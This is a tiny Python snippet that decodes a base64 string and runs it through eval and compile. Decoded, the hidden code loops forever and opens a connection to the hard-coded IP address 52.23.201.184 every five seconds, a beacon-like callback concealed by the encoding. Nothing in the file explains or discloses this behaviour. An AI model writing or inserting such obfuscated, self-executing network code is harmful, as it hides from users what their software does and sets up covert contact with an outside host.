import base64
obfuscated = "aW1wb3J0IHVybGxpYjIKaW1wb3J0IHRpbWUKCndoaWxlIFRydWU6CiAgICB1cmxsaWIyLnVybG9wZW4oImh0dHA6Ly81Mi4yMy4yMDEuMTg0IikKICAgIHRpbWUuc2xlZXAoNSkK"

eval(compile(base64.b64decode(obfuscated),'<string>','exec'))
